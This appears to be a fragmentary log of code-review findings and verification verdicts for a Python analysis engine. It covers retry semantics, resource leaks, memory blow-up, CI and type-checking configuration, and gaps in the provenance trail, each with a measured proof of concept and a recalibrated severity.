SEVERITY RECALIBRATION to MEDIUM (down from claimed HIGH): The engine is single-threaded and never fans out reasoning calls itself (ADR-0002: engine does not import adapters); concurrency must originate in caller/adapter code. The pool is process-global and shared, so any caller doing parallel batch reasoning (LLM-judge / bulk classification over rows against a 120s-timeout local Ollama model) is exposed and would convert brief, self-healing contention into widespread non-retryable failures. That is a real production hazard. But (a) realized impact depends on out-of-engine concurrency the engine does not itself create, and (b) the guard is a deliberately-placed safety mechanism (docstring line 70 documents saturation as non-transient; comment 174-176 states it guards leaked/hung slots) — the defect is over-broad classification of a transient condition as fatal, not the absence of protection. Hence MEDIUM, not HIGH.
verdicts.evidence:
Files read: /Users/[REDACTED]/hc-assay/src/assay_engine/reasoning/seam.py lines 60-104 (error classes + retry constants), 132-177 (bounded pool, _submit_bounded, _with_timeout), 400-459 (_attempt + _run_with_retries). Confirmed line 153 raises PermanentReasoningError on saturation; line 448 re-raises it without retry; PermanentReasoningError (69) is subclass of ReasoningError (65), not RateLimitError (73).

PoC #1 (/tmp/poc_sat.py against /Users/[REDACTED]/hc-assay/.venv/bin/python): "inflight after filling: 8" → "fast call -> PermanentReasoningError: reasoning timeout pool saturated (8/8 in-flight)" → "is subclass of RateLimitError? False" → "inflight after drain: 0" → "post-drain fast call SUCCEEDED: 99". Proves transient + non-retryable classification.

PoC #2 (/tmp/poc_concurrent.py): 12 concurrent legitimate 0.5s (non-hung) calls, 8 workers → {'ok': 8, 'permanent': 4, 'other': 0}, final inflight 0. Proves healthy concurrent load triggers the fatal guard with no hung threads, and fully drains afterward.

grep confirmed no Semaphore/acquire/Queue/backpressure wait in seam.py (only docstring mentions). Engine-wide grep found no ThreadPool/concurrent/joblib usage outside the seam's own pool — concurrency is caller-driven, consistent with the dataset-agnostic engine design.

verdicts.reasoning:
The technical core of the finding is accurate and I reproduced it. In seam.py, `_submit_bounded` raises `PermanentReasoningError` on pool saturation (line 153), and `_run_with_retries` catches `PermanentReasoningError` first and re-raises with no retry/backoff (lines 448-449). The condition is genuinely transient/self-healing: my PoC against the venv filled all 8 slots with calls that exceed the caller timeout, observed `_inflight==8` and a 9th trivial call refused with a non-retryable `PermanentReasoningError`, then after the underlying backend calls returned, `_inflight` dropped back to 0 and the same fast call succeeded. So classifying a recoverable backpressure condition as a "never retry" permanent fault is a real error-classification/reliability weakness, and the suggested fix (a retryable RateLimitError-style backpressure signal, or a bounded semaphore wait so callers queue) is the right shape.

However, the CLAIMED severity (HIGH) is overstated for three concrete reasons that downgrade it to MEDIUM:

1. No internal concurrency. I grepped the engine (pipeline.py, orchestration, all of src/assay_engine) and found no parallel fan-out over the reasoning seam — no ThreadPool/ProcessPool/as_completed/gather/TaskGroup driving concurrent `run`/`run_json` calls. The study pipeline invokes reasoning serially. The 8-slot pool is per-process; for saturation to occur at all, the *embedding application* must itself drive >=8 concurrent calls. The finding's "modest concurrency turns brief pressure into widespread permanent failures" presupposes a concurrency model the engine does not contain.

2. Saturation requires genuinely-leaked slots, not transient busy-ness. A ThreadPoolExecutor queues submissions normally; a slot is only still counted in `_inflight` after the caller's wall-clock timeout because the worker thread is blocked inside an uninterruptible backend call (documented at lines 174-177). With BULK_TIMEOUT+10 up to ~130s and HIGH_STAKES_TIMEOUT+30 up to ~330s, `_inflight==8` means eight simultaneously-hung long calls — already a degraded state, not "brief pressure." Treating that as effectively fatal is a defensible (if blunt) choice.

3. It is an intentional, tested design choice. tests/test_reasoning.py (test_submit_bounded_fails_fast_when_saturated:151, test_pool_saturation_and_release_under_real_threads:178) explicitly assert the saturation guard raises `PermanentReasoningError` as documented fail-fast behavior, and the module docstring (line 17) calls it a "saturation guard."

Net: a real production-readiness rough edge in error semantics/backpressure (recoverable condition surfaced as non-retryable), worth fixing per the suggested approach, but bounded in blast radius and only triggered under an already-degraded hung-backend state — MEDIUM, not HIGH.
verdicts.evidence: See reasoning and evidence above.

finding.title: run_json applies retries multiplicatively, causing a retry-storm and unbounded blocking time with no overall deadline
finding.description: `run_json` loops `MAX_RETRIES+1` times (line 531) and each iteration calls `_run_with_retries` (line 542), which itself retries up to `MAX_RETRIES` transient attempts AND up to `RATE_LIMIT_MAX_RETRIES` rate-limit attempts. The budgets multiply. PoC (transient errors every attempt): `_attempt` is invoked 9 times = (MAX_RETRIES+1)^2, not the intended ~3. Worse, the rate-limit path: per outer iteration the rate budget sleeps sum(RATE_LIMIT_BACKOFF*(r+1) for r in 0..4) = 450s; times 3 outer iterations = 1350s of pure backoff sleep, PLUS up to (HIGH_STAKES_TIMEOUT+30)=330s of actual work per attempt. A single `run_json()` call on a public API can therefore block the caller for ~22+ minutes with no overall timeout/deadline. This is both a retry storm (toward an already rate-limited backend) and a missing-timeout/unbounded-blocking defect.
finding.suggested_fix: Do not nest two retry layers. Either (a) call `_attempt`+`extract_json` directly inside run_json's loop (no inner `_run_with_retries`), or (b) keep `_run_with_retries` and have run_json only re-roll on JSON *parse* failures (not on transient errors the inner loop already handled). Add an absolute wall-clock deadline budget shared across all retries/backoffs so a single call cannot block indefinitely.

verdicts.reasoning:
Verified true. run_json (src/assay_engine/reasoning/seam.py:531) loops MAX_RETRIES+1 (=3) times and each iteration calls _run_with_retries (line 542), which has its OWN independent transient (MAX_RETRIES=2 -> 3 attempts) and rate-limit (RATE_LIMIT_MAX_RETRIES=5) budgets. The two layers multiply because the outer loop catches ReasoningError broadly (line 543), which includes transient/rate-limit errors the inner loop already exhausted and re-raised — even though the docstring (lines 509, 514-517) states the outer loop's intent is to re-roll ONLY on JSON parse failure.

Concrete PoC against the venv confirms both quantitative claims exactly:
- Transient-every-attempt: _attempt invoked 9 times = (MAX_RETRIES+1)^2, not the intended 3.
- Rate-limit-every-attempt: _attempt invoked 18 times with a total backoff-sleep budget of 1350s (22.5 minutes). The inner rate-limit path sleeps RATE_LIMIT_BACKOFF*(r+1) for r in 0..4 = 30+60+90+120+150 = 450s per inner exhaustion, times 3 outer iterations = 1350s.

There is no overall wall-clock/deadline budget anywhere (grep for deadline/monotonic/wall_clock found nothing); the only bound is the per-attempt timeout (_with_timeout: HIGH_STAKES_TIMEOUT+30=330s, BULK_TIMEOUT+10=130s). So a single run_json call can synchronously block the caller ~22+ minutes while issuing a retry-storm toward an already rate-limited subscription backend — the opposite of good backpressure.

This is not excused by any hard constraint: it is unrelated to local-first/no-metered-API/lazy-import/ADR rules. The bounded pool saturation guard and per-attempt timeouts keep each individual attempt finite, so it is not literally infinite — but the multiplicative budget is clearly unintended and produces a real production reliability/resource hazard.

Severity: HIGH is defensible. A ~22-minute synchronous block plus a retry storm against a struggling backend is a genuine availability/resource defect that also amplifies load on a rate-limited dependency. Not CRITICAL (no data loss/corruption/security; calls are technically bounded). The assessor's suggested fix (don't nest retry layers; re-roll outer loop only on JSON parse failures; add a shared wall-clock deadline) is correct.
verdicts.evidence: Read src/assay_engine/reasoning/seam.py in full. Key lines: run_json loop at 531; broad `except ReasoningError` at 543 wrapping `extract_json(_run_with_retries(attempt_req))` at 542; _run_with_retries inner budgets at 441-459 (transient at 455-459, rate-limit at 450-454); config defaults at 101-104 (MAX_RETRIES=2, RATE_LIMIT_BACKOFF=30, RATE_LIMIT_MAX_RETRIES=5); per-attempt timeouts at 414 and 434. PoC (/tmp/poc_seam.py) run with the project venv: PoC1 mocked _attempt to always raise ReasoningError -> _attempt invoked 9 times ((MAX_RETRIES+1)^2). PoC2 mocked _attempt to always raise RateLimitError and intercepted time.sleep -> _attempt invoked 18 times, total backoff sleep 1350.0s (22.5 min). grep across src/ for run_json callers and for deadline/monotonic/wall_clock confirmed no overall deadline exists; only test callers reference run_json.

verdicts.reasoning: Confirmed via PoC against the venv. run_json (src/assay_engine/reasoning/seam.py:531) nests two retry layers: the outer loop runs MAX_RETRIES+1 (=3) times and each iteration calls _run_with_retries (line 542), which has its own independent transient (MAX_RETRIES=2) and rate-limit (RATE_LIMIT_MAX_RETRIES=5) budgets. Because the outer handler is `except ReasoningError` (line 543) and both RateLimitError and the transient ReasoningError subclass ReasoningError (verified), an error that exhausts the inner loop bubbles up and is re-driven by the outer loop — the budgets multiply. finding.title: Postgres ConnectionPool is leaked (never closed) when schema bootstrap fails after the pool opens
finding.description: In `get_checkpointer`, the pool is opened and registered (line 182-190), then schema bootstrap runs inside the try (lines 194-210). If Postgres is reachable but bootstrap fails (missing CREATE privileges, advisory-lock error, a `setup()` DDL error, transient connection drop during DDL), the `except Exception` at line 212 builds a redacted message and re-raises `RuntimeError` — but the already-open pool is NEVER closed. It remains in `_OPEN_POOLS` (so it is only freed at process exit) holding min_size=1 live connection plus a background worker thread. PoC: stubbing `ConnectionPool` so `.connection()` raises during bootstrap, calling `get_checkpointer` 3 times leaves 3 live pools registered and `close()` called 0 times. A caller that retries connecting (a natural reaction to a connection failure) accumulates live pools/connections/threads unbounded.
finding.suggested_fix: In the `except` handler (or a `finally`/try-around-bootstrap), close the pool that was opened in this call before re-raising — e.g. `_safe_close(pool)` and remove it from `_OPEN_POOLS` — so a failed init does not leak the connection/worker thread it just created.

finding.title: QdrantVectorStore owns and never closes its self-constructed client (connection/handle leak)
finding.description: When no client is injected, `QdrantVectorStore.__init__` constructs its own `QdrantClient` via `get_qdrant_client()` (line 64) and stores it on `self._client`, but the class exposes no `close()`/context-manager and never closes the client. `QdrantClient` holds an underlying HTTP connection pool (httpx) / gRPC channel; for a self-constructed client the store is the sole owner, so the connection resources are leaked for the lifetime of every store instance with no deterministic release. Long-running processes that create many short-lived stores accumulate client connection pools.
finding.suggested_fix: Make `QdrantVectorStore` a context manager (`__enter__`/`__exit__`) and/or add a `close()` that calls `self._client.close()` — but only for clients it created itself (track an `_owns_client` flag so an injected client, owned by the caller, is not closed).

verdicts.reasoning:
The finding is factually correct and is a genuine (if bounded) resource-management defect, not a false positive or a constraint-justified design choice.

Code facts (src/assay_engine/persistence/vectorstore.py): __init__ self-constructs a client via get_qdrant_client() when none is injected (line 64) and stores it on self._client. The class exposes no lifecycle release path — PoC confirmed QdrantVectorStore has no close(), no __enter__/__exit__, and no __del__.

Resource reality (verified against the venv qdrant_client): the production construction path get_qdrant_client() calls QdrantClient(host=..., port=...), which yields a QdrantRemote inner client holding an httpx HTTP connection pool plus lazily-created gRPC channel pools. QdrantClient.close() exists specifically to release these (its source forwards to self._client.close(grpc_grace=...)). So for a self-constructed client the store is the sole owner and never releases the pool — a deterministic-release gap. Long-running processes that create many short-lived self-owned stores accumulate connection pools.

Not constraint-justified: the hard constraints (loopback-only, no metered API, engine-no-adapter-imports, lazy heavy backends) are about network locality and import structure, none of which bear on resource cleanup. Crucially the sibling module checkpoint.py establishes the codebase's OWN cleanup convention for backend handles — _safe_close(), _close_all_pools(), _register_pool_cleanup(), and atexit registration for Postgres ConnectionPool (lines 133-154, 190). vectorstore.py has no equivalent, so this is an inconsistent omission rather than an intentional pattern. The suggested fix (add close()/context manager guarded by an _owns_client flag so injected/caller-owned clients are not closed) is correct and aligns with the existing checkpoint approach.

Severity: LOW is the right calibration. Impact is bounded — no correctness, security, or data-loss consequence; both the unit and live integration tests inject a caller-owned client (tests/integration/test_persistence_live.py lines 55-57), so the only affected path is repeated self-constructed stores in a long-running process, an edge usage for a reference implementation. Worth fixing for consistency and production hygiene, but minor.

finding.title: cosine_similarity_matrix converts the O(n^2) numpy result to a nested Python list, ~70x-ing peak memory and serializing the win
finding.description: _cosine_matrix_numpy computes the n x n similarity matrix vectorized (good), then at line 112 returns `[[float(v) for v in row] for row in m]` — a full nested Python list of n^2 native float objects. A numpy float64 cell is 8 bytes; a boxed Python float is ~24 bytes plus list-pointer overhead (~8 B) and the per-row list headers, i.e. roughly 32-56 B/cell, ~4-7x the dense array. The conversion is also a pure-Python O(n^2) loop that dominates runtime at scale. PoC against the venv (numpy 2.4.6): n=3000, d=384 (MiniLM-size corpus) took 7.76 s and 390 MB of tracked Python allocation; the returned nested list alone is ~576 MB by the cell-overhead estimate. Breaking point: a corpus of ~5-10k embeddings (25M-100M cells) produces a multi-GB nested list and minutes of boxing time on a Mac mini, OOM-risking the box well before the underlying matmul would. The function signature forces the dense materialization regardless of caller need (most callers want top-k neighbors, a threshold graph, or block-wise stats — none need the full boxed matrix).
finding.suggested_fix: Return the numpy ndarray (or a thin read-only view) from the numpy path instead of boxing to nested lists, letting callers index without the 4-7x blow-up; or expose a streaming/blocked API (e.g. top-k per row, or a generator over row blocks) so the full n x n matrix is never materialized. If a list-of-lists must stay for the pure path's contract, gate the dense materialization behind an explicit `as_dense=True` and document that it is O(n^2) memory.

verdicts.reasoning:
The mechanism is real: src/assay_engine/baseline/primitives.py:112 (`return [[float(v) for v in row] for row in m]`) boxes the dense numpy similarity matrix into a nested Python list, and the public API (cosine_similarity_matrix, line 115) is contractually list[list[float]] with no streaming/top-k/blocked alternative, so a full O(n^2) dense matrix is always materialized regardless of caller need. My PoC confirms the boxing loop (0.46s) dwarfs the actual vectorized numeric work (0.019s) at n=3000, and the nested list does cost ~4x an equivalent ndarray.

But the finding is materially over-stated, and its severity rests on a flawed benchmark:

1) The "~70x peak memory" headline and "~576 MB nested list" are wrong. Measured deep size of the returned nested list at n=3000,d=384 is 294 MB vs 72 MB for the equivalent ndarray = 4.1x, not 70x. (4.1x is the textbook boxed-float-vs-float64 factor.) The "70x" appears to conflate per-cell byte ratios with something else; it is not reproducible.

2) The "7.76 s" runtime (and "minutes of boxing on a Mac mini") is a tracemalloc artifact. Under tracemalloc the function takes ~7.9s; with tracemalloc off, clean wall-clock is 0.33s at n=3000 and 0.91s at n=5000. cProfile confirms 0.587s total. Projected n=10k is single-digit seconds, not minutes.

3) OOM risk is overstated. n=10k nested list is ~3.2 GB vs 0.8 GB ndarray on a 17 GB box — wasteful but not an automatic OOM, and no internal engine pipeline calls this at scale; only tests and the public API reference it (grep confirms zero engine-internal large-corpus callers).

4) Returning a raw ndarray as the suggested fix would break the module's explicit dependency-free contract (ADR-0002; the module docstring states the contract stays NumPy-free and the pure/numpy paths must agree on the same return type) — so the simplest suggested fix conflicts with a hard constraint. A gated as_dense/streaming API is reasonable but is an enhancement, not a defect fix.

Net: a genuine but minor efficiency/scale wart (≈4x memory, boxing dominates the numeric win), correctly located, but the HIGH severity is built on a tracemalloc-inflated runtime and a ~17x-too-high memory estimate. Recalibrated to LOW.

- Under tracemalloc: 7.90s, peak 385 MB (reproduces the finding's 7.76s/390 MB — confirming those numbers are tracemalloc-inflated).
- Clean wall-clock (no tracemalloc): n=3000 = 0.33s, n=5000 = 0.91s.
- cProfile: total 0.587s, 0.570s self-time in the boxing comprehension; np.asarray input parse 0.014s.
- Time split: vectorized core (norm+matmul+clip+diag) = 0.019s vs nested-list boxing = 0.461s (~24x).

finding.title: CI integration lane runs `pytest --cov` but pytest-cov is not a declared dependency — the lane fails on every run

finding.title: Package version is hardcoded in two independent places (pyproject `version` and `__init__.__version__`), and the second feeds the reproducibility/provenance manifest
finding.description: `pyproject.toml` sets `version = "0.0.1"` (line 7) while `src/assay_engine/__init__.py` separately hardcodes `__version__ = "0.0.1"` (line 28). These are two independent strings with no single source of truth — hatchling is not configured for dynamic versioning (`grep dynamic`/`hatch.version` returns nothing). This is not merely a style nit: `src/assay_engine/baseline/determinism.py` imports `__version__ as _ENGINE_VERSION` (line 24) and stamps it into the determinism/provenance record as `component_versions["engine"]` (line 111), which is part of the hash-chained reproducibility trail. A release that bumps only one of the two strings (the common failure mode) ships a wheel whose distributed version disagrees with the version recorded in every provenance manifest it produces — silently undermining the project's central reproducibility guarantee while passing all tests.
finding.suggested_fix: Single-source the version. Either: (a) set `dynamic = ["version"]` in pyproject and add `[tool.hatch.version] path = "src/assay_engine/__init__.py"` so hatchling reads `__version__` from the module; or (b) drop the literal from `__init__.py` and derive it at runtime via `importlib.metadata.version("assay-engine")`. Option (a) keeps the determinism manifest source authoritative and removes the drift surface.

3. The module `__version__` is consumed by the reproducibility harness: determinism.py:24 imports it as `_ENGINE_VERSION` and line 111 stamps it as `component_versions["engine"]` in the DeterminismRecord.
4. That determinism record flows into the hash-chained provenance trail: pipeline.py:347 passes `determinism=dict(baseline.determinism)` into a provenance entry (built blind under Firewall A).
5. No test asserts the two strings agree (grep over tests/ shows only that "engine" key exists, not that it equals the dist version).
6. Ran the venv: both `assay_engine.__version__` and `importlib.metadata.version("assay-engine")` currently return "0.0.1" — they agree today.

Manifestation requires future human error during a manual release. finding.title: No supply-chain vulnerability scanning (pip-audit) in CI for a security/privacy-focused production engine
finding.description: Neither pyproject.toml nor ci.yml contains any dependency-vulnerability scanning step (`grep -n 'pip-audit\|safety\|bandit'` returns nothing). The project pulls a large, fast-moving transitive surface through its extras — verified by resolving the `observability` extra alone, which installs 150+ packages including cryptography, aiohttp, Flask/Werkzeug, requests, protobuf, grpcio, openai, anthropic, boto3, and SQLAlchemy. With only floor+major-cap ranges (e.g. `cryptography` unconstrained as a transitive, `aiohttp` transitive, `requests` transitive), a clean install on any future day can pull a transitive version with a freshly-disclosed CVE and CI will never notice. For a tool that brands itself for security & privacy data and is being hardened for production, the absence of an advisory-database check (and of a lockfile / constraints file for the heavy lanes) is a genuine supply-chain gap rather than a style preference.
finding.suggested_fix: Add a CI job (or step in the integration lane) that runs `pip-audit` against the installed environment, failing on known vulnerabilities (with an allowlist file for accepted/unfixable advisories). Consider also committing a constraints/lock file (e.g. `pip-compile` output or `uv.lock`) for the heavy extras so installs are reproducible and audited, while keeping pyproject ranges permissive for library consumers.

3. No lockfile or constraints file exists anywhere in the repo (searched for *.lock, constraints*.txt, requirements*.txt). Dependencies use floor+major-cap ranges (e.g. cryptography is not even directly declared — it is an unconstrained transitive; aiohttp/requests/urllib3 likewise transitive).
4. The heavy extras surface is real and large: the venv with extras installed has 217 packages, and I confirmed every security-sensitive package the assessor named is actually present: cryptography 48.0.1, aiohttp 3.14.1, requests 2.34.2, Flask 3.1.3, Werkzeug 3.1.8, protobuf 6.33.6, grpcio 1.81.1, openai 2.41.1, anthropic 0.109.2, boto3 1.43.30, SQLAlchemy 2.0.51, urllib3 2.7.0, Jinja2 3.1.6, Pillow 12.2.0.

A CVE in a transitive dependency executes on the very box that holds the sensitive security/privacy data — that is the exact asset the project protects. SECURITY.md brands the project as security/privacy-focused and invites supply-chain-adjacent findings. None of the documented constraints (loopback-only, no metered API, engine-never-imports-adapters, lazy heavy backends) address advisory-database scanning. So the gap is real and the constraints actually reinforce it rather than waive it.

Severity calibration: MEDIUM is correct. But for a tool being hardened for production that handles sensitive data through a large, fast-moving transitive surface with no lockfile and no advisory check in CI, this is a legitimate medium-severity supply-chain/ops finding. Not HIGH (no demonstrated active vulnerability today; core is dependency-free), not LOW (it is more than a nit for a security-branded production engine).

finding.title: mypy is pinned to `python_version = "3.11"` but CI advertises and matrix-tests up to 3.14, so 3.12–3.14-only type errors are never caught
finding.description: `[tool.mypy] python_version = "3.11"` forces mypy to type-check the code as if running on Python 3.11 regardless of the runner's interpreter. The core CI lane runs mypy across a 3.11–3.14 matrix and the integration lane runs it on 3.12, but because the analysis target is fixed at 3.11, type behavior that differs across versions (e.g. stdlib stubs that gained/changed signatures in 3.12+, version-gated typing constructs) is only ever validated at the 3.11 floor. The project classifies and matrix-tests 3.14 as supported, so the type checker should also exercise the newer targets to make that support real rather than asserted.
finding.suggested_fix: Either remove the fixed `python_version` so mypy infers the target from the running interpreter (letting the matrix exercise each version), or run an explicit mypy invocation per matrix Python (`mypy --python-version ${{ matrix.python-version }}`). Keep the lazy-backend overrides as-is.

verdicts.reasoning:
The configuration facts are accurate: pyproject.toml:87 pins [tool.mypy] python_version = "3.11"; .github/workflows/ci.yml:15 matrix-tests 3.11-3.14 in the core lane and 3.12 in the integration lane (ci.yml:61); pyproject classifiers advertise 3.11-3.14 (pyproject.toml:21-24, requires-python >=3.11,<3.15). So mypy always analyzes against the 3.11 target regardless of the runner interpreter, meaning version-specific typing behavior across 3.12-3.14 is not exercised by the type checker even though those versions are claimed as supported. That makes the finding a genuine ops/hygiene gap.

However, the severity and the claimed risk are overstated. My PoC shows pinning to the LOWER version (3.11) is generally the MORE conservative/strict choice for typing: typing.override is flagged as unavailable at --python-version 3.11 but accepted at 3.14 (opposite of the finding's "newer-only errors are masked" premise). The one genuine direction it could catch (constructs valid on 3.11 but removed in 3.14, e.g. typing.ByteString) did not even reproduce — mypy/typeshed flagged nothing at either target. Most decisively, the actual codebase only uses stable typing constructs (Any, Callable, Mapping, Protocol, TypeVar, runtime_checkable; no typing.override, no removed-in-3.14 names; one guarded TYPE_CHECKING block), and real mypy runs pass identically at both 3.11 and 3.14 (40 files, no issues). There is therefore no current defect, only the theoretical possibility that a future version-gated construct slips through. The suggested fix (mypy --python-version ${{ matrix.python-version }} per matrix entry) is correct and cheap, so this remains a valid low-severity hardening item rather than a false positive or a production blocker.

PoC in /tmp/mypy_poc: (1) typing.override -> ERROR at --python-version 3.11, SUCCESS at 3.14 (shows 3.11 pin is stricter, opposite of claim); (2) typing.ByteString and asyncio.get_event_loop -> no error at either target. grep of src/ typing imports: only stable constructs, one TYPE_CHECKING guard (methodology/adjudication.py:37), no version-gated names. The CI core lane (.github/workflows/ci.yml:15,30) runs a 3.11-3.14 matrix and invokes bare `mypy`; the integration lane (ci.yml:61,67) runs bare `mypy` on 3.12. finding.title: A raised run leaves a partial provenance trail with no failure entry — the abort reason is unrecoverable from the trail
finding.line: 269-528 (try/finally around the phase machine; finally at 522-527 records nothing)
finding.description: GOVERNANCE.md §3 and the docstring at lines 102-103 explicitly promise that "a caller may pass its own trail to run_study so a run that *raises* (a blocked gate, a firewall violation) still leaves an auditable partial trail." That partial trail is auditable for what *succeeded*, but it records NOTHING about the failure itself: when any phase raises (IngestionError, FirewallViolation, PreRegistrationError, GateError, or an adapter exception), control leaves through the bare try/finally at lines 269/522 and the finally block only calls tracker.end_run — it never records a provenance entry for the abort. PoC against the venv (BadParser raising during INGEST, caller-owned trail): the trail ends at seq 0 'run_start' and seq 1 'phase enter INGEST', then stops. An auditor reading the trail alone cannot distinguish "run aborted at ingest because the parser hit disk corruption" from "run is still in progress" or "run completed but stopped logging" — the single most diagnostic fact (what failed and why) is absent precisely on the failure path the partial-trail feature exists to serve. The trail is the spine of reproducibility and of diagnosing a blocked run; a silent truncation is an audit hole, not an audit record.
finding.suggested_fix: Wrap the phase machine body in try/except/finally: on any exception, before re-raising, record a terminal entry e.g. trail.record('run_failed', f'{type(exc).__name__} during {visited[-1].name if visited else "start"}', error_type=type(exc).__name__, message=str(exc), last_phase=visited[-1].name if visited else None). Keep it inside the chain (so verify_records still passes) and guard the record() call itself so a provenance failure during teardown does not mask the original exception. This makes the partial trail self-describing: it ends with an explicit, chained 'this is why the run stopped' entry.

verdicts.reasoning:
CONFIRMED as a real production-readiness defect, with a severity recalibration from HIGH to MEDIUM.

The structural claim is accurate. In src/assay_engine/pipeline.py the entire phase machine is wrapped in a bare try/finally (try at 269, finally at 522-527). The finally block does ONLY best-effort tracker.end_run() — it records no provenance entry for the abort. When any phase raises (IngestionError, FirewallViolation, PreRegistrationError, adapter exceptions), control leaves through finally and the caller-owned trail is left truncated with no entry describing what failed or why.

finding.title: Failed runs are terminated in the experiment tracker as FINISHED — a failed run is indistinguishable from a successful one in the metric store
finding.description: run_study's finally block calls tracker.end_run(run_id) on every exit path, including when a phase raised. MlflowExperimentTracker.end_run calls client.set_terminated(run_id) with no status argument, and MLflow's set_terminated defaults status to "FINISHED" (confirmed from the installed mlflow: the signature is set_terminated(run_id, status=None, ...) and the docstring states it "Defaults to FINISHED"). Result: a run that aborted on a firewall violation or a blocked gate is recorded in the on-box experiment store with status FINISHED, identical to a clean completion. Operators querying the tracking store (the canonical place to see which runs succeeded) cannot tell failed runs from successful ones, and partial metrics logged before the failure sit under a run that looks complete. This defeats the tracker's role as a production run-status surface.
finding.suggested_fix: Distinguish success from failure: capture the outcome in run_study (e.g. set an `ok` flag true only after trail.verify() succeeds) and pass a status into end_run. Add a status parameter to ExperimentTracker.end_run / MlflowExperimentTracker.end_run (default 'FINISHED', pass 'FAILED' on the exception path) so set_terminated(run_id, status=status) marks aborted runs FAILED. The set_terminated call already tolerates the 'KILLED'/'FAILED' RunStatus values.

I ran a concrete PoC against the venv (ASSAY_TRACKING_URI sqlite store): started a run, logged a partial metric, called end_run on the abort path exactly as the finally does, then read it back — recorded status was FINISHED and the partial metric was still present. I grepped the entire src tree: there is no FAILED/KILLED/RunStatus handling anywhere, so no other code reconciles the status. The suggested fix (thread an ok flag set true only after trail.verify, add a status param to end_run defaulting FINISHED and pass FAILED on the exception path) is sound; set_terminated accepts FAILED/KILLED RunStatus values.

finding.title: Graph-orchestration gate decisions never enter the hash-chained provenance trail — the documented “append-only trail” for the durable path is unchained, untamper-evident LangGraph state
finding.description: There are two governance mechanisms (ADR-0010): the synchronous run_study path records every gate decision into the hash-chained ProvenanceTrail (provenance.py), and the durable LangGraph interrupt/resume path (gatenode.make_gate_node) records decisions as plain dicts appended to a LangGraph state list 'gate_decisions'. GOVERNANCE §3 states the chained ProvenanceTrail "is the spine… No step can be retroactively removed or reordered," and GOVERNANCE.md lines 47-50 call the graph's gate_decisions list "the append-only trail." But the graph path's decisions are NEVER written into the chained ProvenanceTrail: apply_gate_decision takes no trail/recorder and returns a bare dict (PoC confirmed: {'gate_decisions': [{'gate':'review','decision':'rejected','rationale':'no good'}]}), and grep shows no bridge from gate_decisions into ProvenanceTrail (the as_recorder bridge at provenance.py:152 is wired only to the synchronous Gate.evaluate path, not the gatenode). The graph's 'append-only trail' has no prev_hash/entry_hash, no verify_records, and relies entirely on the study correctly declaring a list/add reducer (a documented foot-gun: lines 47-50 warn that a wrong reducer silently drops all but the last decision). So for the durable, cross-process governance path — the one production runs that park for an operator actually use — the most governance-relevant mutations (human approve/reject decisions) are recorded only as unchained, tamper-evident-free state that can be reordered or dropped without detection. The integrity guarantee GOVERNANCE §3 advertises does not hold for this path.
finding.suggested_fix: Bridge graph gate decisions into the chained trail: have make_gate_node (or a thin wrapper) accept a ProvenanceTrail-backed recorder and record each validated decision via trail.record('gate', ...) at apply time, so the durable path's approvals/rejections land in the same hash-chained, verify_records-checkable trail as the synchronous path. At minimum, reconcile the docs to stop calling the unchained gate_decisions list an "append-only trail" with the same integrity as §3, and document that the graph path requires an explicit provenance bridge for a tamper-evident governance record.

verdicts.reasoning:
The factual core of the finding is verified against the real code. The durable LangGraph governance path (make_gate_node / apply_gate_decision in src/assay_engine/orchestration/gatenode.py) records operator approve/reject/defer decisions as plain dicts appended to LangGraph state under the key "gate_decisions" and NEVER writes them into the hash-chained ProvenanceTrail. I confirmed by reading gatenode.py (lines 44-70, 86-117): the function signatures take no trail/recorder (apply_gate_decision(gate, resumed); make_gate_node(gate, propose)), and grep shows the module never references evaluate/record/trail/recorder/precondition — the Gate object is used only for gate.name and validation. apply_gate_decision returns {"gate_decisions": [record]} (PoC reproduced exactly). The chained-trail bridge ProvenanceTrail.as_recorder (provenance.py:152) is wired only into the synchronous Gate.evaluate path (gates.py:97-98) and into run_study's run_gate -> trail.record("gate", ...) (pipeline.py:232-239); make_gate_node bypasses both.

The real defect has two parts. (1) Missing primitive: the engine's durable governance node gives a cloning study no hook to land decisions in the tamper-evident chain — recording happens inside the node's interrupt loop and emits a bare dict, so a study can't intercept it without re-implementing the node. (2) Documentation/guarantee overclaim: the gates.py module docstring (lines 16-21) states that BOTH gate mechanisms "record every decision to the append-only provenance trail... the present-tense guarantees in GOVERNANCE.md hold," and recommends the graph mechanism precisely "when you need cross-process durable parking." That is false for the durable path: GOVERNANCE §3's integrity properties (prev_hash/entry_hash chaining, verify_records, no reorder/removal) do not hold for the unchained gate_decisions list. For a project whose value proposition is provenance "a hostile reviewer cannot dismiss," the operator-parking path being outside the chain is a genuine gap.

Severity recalibrated from HIGH to MEDIUM, not dismissed. Mitigating factors: decisions are not lost — they persist in the durable LangGraph checkpointer state (durability="sync", graph.py); the engine's own unkeyed chain is honestly scoped to "tamper-evident against naive tampering," not forgery-proof, so the marginal integrity loss on the graph path is bounded; and there is no in-engine production consumer wiring make_gate_node with the false expectation today (the reference study and run_study use the synchronous chained path, and graph topology is the study's responsibility per ADR-0002). It is not a crash or data-corruption bug. But it is a real, fixable production-readiness defect: the durable governance path lacks any provenance bridge AND a load-bearing docstring asserts integrity equivalence that does not hold. The suggested fix (give make_gate_node an optional ProvenanceTrail-backed recorder and reconcile the gates.py/GOVERNANCE wording) is appropriate.

PoC (venv .venv/bin/python): apply_gate_decision(gate, {'gate_id':'review','decision':'rejected','rationale':'no good'}) -> {'gate_decisions': [{'gate':'review','decision':'rejected','rationale':'no good'}]}; signatures confirmed to take no trail/recorder.

The chained-trail's as_recorder bridge (provenance.py:152) is wired only to the synchronous Gate.evaluate/run_study path. (c) The wrong-reducer data-loss case is already explicitly documented as a cloner foot-gun (GOVERNANCE.md 47-50; gatenode.py 26-28).
